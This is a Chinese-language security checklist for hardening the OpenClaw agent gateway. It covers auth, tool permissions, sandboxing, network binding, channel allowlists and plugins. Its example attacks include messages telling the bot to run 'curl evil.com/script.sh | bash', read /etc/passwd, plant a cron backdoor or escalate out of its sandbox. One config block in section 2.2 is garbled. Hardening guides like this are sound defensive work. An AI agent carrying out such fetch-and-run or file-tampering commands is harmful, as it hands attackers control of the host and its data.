# OpenClaw 安全检测清单全集

> 完整安全检测项 - 包含所有详情
> 
> 版本: 1.0
> 更新: 2026-02-28

---

## 一、认证与访问控制

### 1.1 gateway.auth.mode

| 项目 | 内容 |
|------|------|
| **检测项** | gateway.auth.mode |
| **期望值** | token |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
未启用 Token 认证模式

**影响面范围**:
- **影响组件**: Gateway 认证
- **影响范围**: 所有访问
- **攻击向量**: 未授权访问 Gateway

**实际案例**:
```
攻击者发现 Gateway 未设置认证
→ 直接访问 Control UI
→ 查看所有会话记录
→ 获取 API Keys
→ 完全控制 Bot
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 无需认证 | 需要 Token |
| 任何人可访问 | 仅授权用户可访问 |

**修复配置**:
```json
{
  "gateway": {
    "auth": {
      "mode": "token"
    }
  }
}
```

**一键修复**:
```bash
openclaw config set gateway.auth.mode token --json
```

---

### 1.2 gateway.auth.token

| 项目 | 内容 |
|------|------|
| **检测项** | gateway.auth.token |
| **期望值** | >= 32 字符 |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
Token 长度不足，容易被暴力破解

**影响面范围**:
- **影响组件**: Gateway 认证
- **影响范围**: 所有访问
- **攻击向量**: Token 暴力破解

**实际案例**:
```
Token 只有 8 位: "abc12345"
→ 攻击者暴力破解
→ 短时间内破解成功
→ 获取完整控制权限
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 短 Token (8位) | 长 Token (32+位) |
| 可被破解 | 几乎不可能破解 |

**修复配置**:
```bash
# 生成新 Token
openssl rand -hex 32
```

---

### 1.3 session.dmScope

| 项目 | 内容 |
|------|------|
| **检测项** | session.dmScope |
| **期望值** | per-channel-peer |
| **风险** | 🟠 HIGH |

**问题描述**: 
会话隔离策略过于宽松

**影响面范围**:
- **影响组件**: 会话管理
- **影响范围**: 多用户场景
- **攻击向量**: 会话混淆、跨用户攻击

**实际案例**:
```
多用户场景，dmScope=main
→ 用户 A 发送敏感指令
→ 用户 B 的会话也收到
→ 隐私泄露
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 共享会话 | 按频道+用户隔离 |
| 会话混乱 | 会话清晰分离 |

**修复配置**:
```json
{
  "session": {
    "dmScope": "per-channel-peer"
  }
}
```

---

## 二、工具权限控制

### 2.1 tools.profile

| 项目 | 内容 |
|------|------|
| **检测项** | tools.profile |
| **期望值** | minimal 或 messaging |
| **风险** | 🟡 MEDIUM |

**问题描述**: 
工具 profile 未设置，使用默认工具集

**影响面范围**:
- **影响组件**: 工具集
- **影响范围**: 所有会话
- **攻击向量**: 利用多余工具攻击

**实际案例**:
```
默认 profile 包含 exec, fs, network 等
→ 攻击者可利用任何工具
→ 攻击面最大化
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 默认工具集 | 最小工具集 |
| 攻击面大 | 攻击面小 |

**修复配置**:
```json
{
  "tools": {
    "profile": "messaging"
  }
}
```

---

### 2.2 tools.deny

| 项目 | 内容 |
|------|------|
| **检测项** | tools.deny |
| **期望值** | 包含 group:automation, group:runtime |
| **风险** | 🟠 HIGH |

**问题描述**: 
危险工具组未被禁用

**影响面范围**:
- **影响组件**: 自动化工具、运行时工具
- **影响范围**: 所有会话
- **攻击向量**: 创建恶意任务、执行恶意代码

**实际案例**:
```
攻击者发送: "帮我设置每日任务"
→ 创建定时任务窃取数据
→ 持续泄露敏感信息
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 工具组可用 | 工具组被禁用 |
| 可创建恶意任务 | 无法创建 |

:
```json
{
  "tools**修复配置**": {
    "deny": [
      "group:automation",
      "group:runtime"
    ]
  }
}
```

---

### 2.3 tools.fs.workspaceOnly

| 项目 | 内容 |
|------|------|
| **检测项** | tools.fs.workspaceOnly |
| **期望值** | true |
| **风险** | 🟠 HIGH |

**问题描述**: 
文件系统工具可访问任意目录

**影响面范围**:
- **影响组件**: 文件系统工具
- **影响范围**: 整个服务器
- **攻击向量**: 读取/写入敏感文件

**实际案例**:
```
攻击者发送: "查看 /etc/passwd"
→ 系统用户列表泄露

攻击者发送: "写入 /etc/cron.d/backdoor"
→ 植入后门定时任务
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 可访问任意文件 | 只能访问工作区 |
| 系统文件可泄露 | 工作区外保护 |

**修复配置**:
```json
{
  "tools": {
    "fs": {
      "workspaceOnly": true
    }
  }
}
```

---

### 2.4 tools.exec.security

| 项目 | 内容 |
|------|------|
| **检测项** | tools.exec.security |
| **期望值** | deny |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
未禁用 Shell 执行

**影响面范围**:
- **影响组件**: Shell 执行工具
- **影响范围**: 所有会话
- **攻击向量**: 执行恶意命令

**实际案例**:
```
攻击者发送: "执行 curl evil.com/script.sh | bash"
→ 服务器被植入后门
→ 数据被窃取
→ 被用于攻击其他服务器
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 可执行任意命令 | 禁止执行 |
| 风险极高 | 风险极低 |

**修复配置**:
```json
{
  "tools": {
    "exec": {
      "security": "deny"
    }
  }
}
```

---

### 2.5 tools.exec.ask

| 项目 | 内容 |
|------|------|
| **检测项** | tools.exec.ask |
| **期望值** | always |
| **风险** | 🟠 HIGH |

**问题描述**: 
执行前不询问确认

**影响面范围**:
- **影响组件**: 执行确认机制
- **影响范围**: 所有执行
- **攻击向量**: 自动执行危险操作

**实际案例**:
```
攻击者发送: "重启服务"
→ 未确认直接执行
→ 服务中断
→ 业务受损
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 自动执行 | 确认后执行 |
| 无交互 | 用户确认 |

**修复配置**:
```json
{
  "tools": {
    "exec": {
      "ask": "always"
    }
  }
}
```

---

### 2.6 tools.elevated.enabled

| 项目 | 内容 |
|------|------|
| **检测项** | tools.elevated.enabled |
| **期望值** | false |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
未禁用 Elevated 提权工具

**影响面范围**:
- **影响组件**: Elevated 工具
- **影响范围**: 所有会话
- **攻击向量**: 提权突破沙箱

**实际案例**:
```
攻击者: "用管理员权限打开设置"
→ 绕过沙箱
→ 获取 root 权限
→ 完全控制服务器
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 可提权 | 提权禁用 |
| 可突破沙箱 | 保持隔离 |

**修复配置**:
```json
{
  "tools": {
    "elevated": {
      "enabled": false
    }
  }
}
```

---

## 三、沙箱隔离

### 3.1 agents.defaults.sandbox.mode

| 项目 | 内容 |
|------|------|
| **检测项** | agents.defaults.sandbox.mode |
| **期望值** | non-main 或 all |
| **风险** | 🟠 HIGH |

**问题描述**: 
未启用沙箱隔离

**影响面范围**:
- **影响组件**: Agent 执行环境
- **影响范围**: 所有 Agent
- **攻击向量**: 恶意代码直接访问主机

**实际案例**:
```
Agent 处理恶意文件
→ 代码在主机执行
→ 可访问所有资源
→ 主机被控制
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 无沙箱 | 有沙箱 |
| 主机风险 | 隔离安全 |

**修复配置**:
```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "mode": "non-main"
      }
    }
  }
}
```

---

### 3.2 agents.defaults.sandbox.scope

| 项目 | 内容 |
|------|------|
| **检测项** | agents.defaults.sandbox.scope |
| **期望值** | session 或 agent |
| **风险** | 🟡 MEDIUM |

**问题描述**: 
沙箱 scope 过于宽松

**影响面范围**:
- **影响组件**: 沙箱隔离范围
- **影响范围**: 会话间隔离
- **攻击向量**: 会话间污染

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 共享沙箱 | 独立沙箱 |
| 会话间污染 | 会话隔离 |

**修复配置**:
```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "scope": "session"
      }
    }
  }
}
```

---

### 3.3 agents.defaults.sandbox.workspaceAccess

| 项目 | 内容 |
|------|------|
| **检测项** | agents.defaults.sandbox.workspaceAccess |
| **期望值** | none 或 ro |
| **风险** | 🟠 HIGH |

**问题描述**: 
沙箱可读写工作区

**影响面范围**:
- **影响组件**: 工作区文件
- **影响范围**: 所有文件
- **攻击向量**: 恶意修改工作区文件

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 可读写 | 只读/禁止 |
| 文件可篡改 | 文件保护 |

**修复配置**:
```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "workspaceAccess": "none"
      }
    }
  }
}
```

---

### 3.4 agents.defaults.sandbox.docker.network

| 项目 | 内容 |
|------|------|
| **检测项** | agents.defaults.sandbox.docker.network |
| **期望值** | none 或 bridge |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
沙箱使用主机网络

**影响面范围**:
- **影响组件**: 网络隔离
- **影响范围**: 所有网络请求
- **攻击向量**: 网络攻击、横向移动

**实际案例**:
```
沙箱使用 host 网络
→ 可扫描内网
→ 可攻击其他服务
→ 横向移动
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 主机网络 | 隔离网络 |
| 可攻击内网 | 网络隔离 |

**修复配置**:
```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "docker": {
          "network": "none"
        }
      }
    }
  }
}
```

---

## 四、网络安全

### 4.1 gateway.bind

| 项目 | 内容 |
|------|------|
| **检测项** | gateway.bind |
| **期望值** | loopback |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
Gateway 绑定到非本地地址

**影响面范围**:
- **影响组件**: Gateway 监听
- **影响范围**: 网络可达
- **攻击向量**: 远程未授权访问

**实际案例**:
```
Gateway 绑定 0.0.0.0
→ 任何人可访问
→ 未授权使用
→ 数据泄露
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 监听所有地址 | 仅本地访问 |
| 可被远程访问 | 仅本机访问 |

**修复配置**:
```json
{
  "gateway": {
    "bind": "loopback"
  }
}
```

---

### 4.2 gateway.tailscale.mode

| 项目 | 内容 |
|------|------|
| **检测项** | gateway.tailscale.mode |
| **期望值** | off 或 serve |
| **风险** | 🔴 CRITICAL |

**问题描述**: 
Tailscale Funnel 暴露公网

**影响面范围**:
- **影响组件**: 公网暴露
- **影响范围**: 互联网
- **攻击向量**: 公网攻击

**实际案例**:
```
Tailscale funnel 开启
→ Gateway 直接暴露互联网
→ 扫描攻击
→ 完全控制
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 公网暴露 | 局域网/Tailscale |
| 风险极高 | 风险可控 |

**修复配置**:
```json
{
  "gateway": {
    "tailscale": {
      "mode": "off"
    }
  }
}
```

---

## 五、频道访问控制

### 5.1 channels.*.dmPolicy

| 项目 | 内容 |
|------|------|
| **检测项** | channels.{provider}.dmPolicy |
| **期望值** | pairing 或 allowlist |
| **风险** | 🟠 HIGH |

**问题描述**: 
DM 策略过于宽松

**影响面范围**:
- **影响组件**: 消息通道
- **影响范围**: 所有 DM
- **攻击向量**: 垃圾消息、钓鱼攻击

**实际案例**:
```
dmPolicy=open
→ 任何人可 DM Bot
→ 发送钓鱼链接
→ 诱导泄露敏感信息
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 允许所有人 | 需配对/白名单 |
| 风险高 | 风险低 |

**修复配置**:
```json
{
  "channels": {
    "whatsapp": {
      "dmPolicy": "pairing"
    }
  }
}
```

---

### 5.2 channels.*.groupPolicy

| 项目 | 内容 |
|------|------|
| **检测项** | channels.{provider}.groupPolicy |
| **期望值** | allowlist 或 requireMention |
| **风险** | 🟠 HIGH |

**问题描述**: 
群组策略过于宽松

**影响面范围**:
- **影响组件**: 群组消息
- **影响范围**: 所有群组
- **攻击向量**: 群组钓鱼、垃圾消息

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 允许所有群 | 白名单/需@ |
| 风险高 | 风险低 |

**修复配置**:
```json
{
  "channels": {
    "whatsapp": {
      "groupPolicy": "allowlist",
      "groups": {
        "*": {
          "requireMention": true
        }
      }
    }
  }
}
```

---

### 5.3 channels.*.allowFrom

| 项目 | 内容 |
|------|------|
| **检测项** | channels.{provider}.allowFrom |
| **期望值** | 非空列表 |
| **风险** | 🟠 HIGH |

**问题描述**: 
未配置白名单

**影响面范围**:
- **影响组件**: 用户白名单
- **影响范围**: 所有用户
- **攻击向量**: 未授权用户访问

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 无白名单 | 有白名单 |
| 任何人都可 | 仅白名单用户 |

**修复配置**:
```json
{
  "channels": {
    "whatsapp": {
      "allowFrom": ["+15551234567"]
    }
  }
}
```

---

## 六、Node 安全

### 6.1 gateway.nodes.denyCommands

| 项目 | 内容 |
|------|------|
| **检测项** | gateway.nodes.denyCommands |
| **期望值** | 包含危险命令 |
| **风险** | 🟡 MEDIUM |

**问题描述**: 
未禁用危险 Node 命令

**影响面范围**:
- **影响组件**: Node 远程控制
- **影响范围**: 配对设备
- **攻击向量**: 滥用危险命令

**实际案例**:
```
攻击者控制 Node
→ 拍照、录屏、截屏
→ 窃取隐私
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 危险命令可用 | 危险命令禁用 |
| 隐私可被窃取 | 隐私保护 |

**修复配置**:
```json
{
  "gateway": {
    "nodes": {
      "denyCommands": [
        "camera.snap",
        "camera.clip",
        "screen.record"
      ]
    }
  }
}
```

---

## 七、Secrets 管理

### 7.1 secrets.providers.*.source

| 项目 | 内容 |
|------|------|
| **检测项** | secrets.providers.{name}.source |
| **期望值** | env 或 exec |
| **风险** | 🟡 MEDIUM |

**问题描述**: 
使用文件存储凭证

**影响面范围**:
- **影响组件**: 凭证存储
- **影响范围**: 所有凭据
- **攻击向量**: 读取凭据文件

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 文件存储 | 环境变量/Exec |
| 可被读取 | 安全存储 |

---

## 八、日志与监控

### 8.1 logging.redactSensitive

| 项目 | 内容 |
|------|------|
| **检测项** | logging.redactSensitive |
| **期望值** | tools 或 off (不推荐) |
| **风险** | 🟡 MEDIUM |

**问题描述**: 
未启用敏感信息脱敏

**影响面范围**:
- **影响组件**: 日志输出
- **影响范围**: 日志查看者
- **攻击向量**: 日志泄露敏感信息

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 无脱敏 | 敏感信息脱敏 |
| 可能泄露 | 保护隐私 |

**修复配置**:
```json
{
  "logging": {
    "redactSensitive": "tools"
  }
}
```

---

## 九、插件安全

### 9.1 plugins.allow

| 项目 | 内容 |
|------|------|
| **检测项** | plugins.allow |
| **期望值** | 仅官方插件 |
| **风险** | 🟠 HIGH |

**问题描述**: 
允许加载所有插件

**影响面范围**:
- **影响组件**: 插件系统
- **影响范围**: 所有功能
- **攻击向量**: 恶意插件

**实际案例**:
```
plugins.allow=["*"]
→ 可加载任意插件
→ 插件可执行任意代码
→ 完全控制 Gateway
```

**修复效果**:
| 修复前 | 修复后 |
|--------|--------|
| 允许所有插件 | 仅官方插件 |
| 风险高 | 风险低 |

**修复配置**:
```json
{
  "plugins": {
    "allow": ["@openclaw/*"]
  }
}
```

---

## 十、快速修复命令

### 10.1 一键修复

```bash
# 认证
openclaw config set gateway.auth.mode token --json

# 会话
openclaw config set session.dmScope per-channel-peer --json

# 工具
openclaw config set tools.profile messaging --json
openclaw config set tools.deny '["group:automation", "group:runtime", "group:fs"]' --json
openclaw config set tools.fs.workspaceOnly true --json
openclaw config set tools.exec.security deny --json
openclaw config set tools.exec.ask always --json
openclaw config set tools.elevated.enabled false --json

# 沙箱
openclaw config set agents.defaults.sandbox.mode non-main --json
openclaw config set agents.defaults.sandbox.scope session --json
openclaw config set agents.defaults.sandbox.workspaceAccess none --json
openclaw config set agents.defaults.sandbox.docker.network none --json

# 网络
openclaw config set gateway.bind loopback --json
openclaw config set gateway.tailscale.mode off --json
```

---

## 十一、检测清单汇总

### 11.1 必检项

| # | 检测项 | 风险 | 状态 |
|---|--------|------|------|
| 1 | gateway.auth.mode | 🔴 CRITICAL | |
| 2 | gateway.auth.token | 🔴 CRITICAL | |
| 3 | tools.exec.security | 🔴 CRITICAL | |
| 4 | tools.elevated.enabled | 🔴 CRITICAL | |
| 5 | gateway.bind | 🔴 CRITICAL | |
| 6 | gateway.tailscale.mode | 🔴 CRITICAL | |
| 7 | sandbox.docker.network | 🔴 CRITICAL | |
| 8 | tools.deny | 🟠 HIGH | |
| 9 | tools.fs.workspaceOnly | 🟠 HIGH | |
| 10 | tools.exec.ask | 🟠 HIGH | |
| 11 | sandbox.mode | 🟠 HIGH | |
| 12 | sandbox.workspaceAccess | 🟠 HIGH | |
| 13 | dmPolicy | 🟠 HIGH | |
| 14 | groupPolicy | 🟠 HIGH | |
| 15 | allowFrom | 🟠 HIGH | |
| 16 | plugins.allow | 🟠 HIGH | |
| 17 | session.dmScope | 🟠 HIGH | |
| 18 | tools.profile | 🟡 MEDIUM | |
| 19 | sandbox.scope | 🟡 MEDIUM | |
| 20 | nodes.denyCommands | 🟡 MEDIUM | |
| 21 | secrets providers | 🟡 MEDIUM | |
| 22 | logging.redactSensitive | 🟡 MEDIUM | |

---

*清单版本: 1.0*
*更新: 2026-02-28*
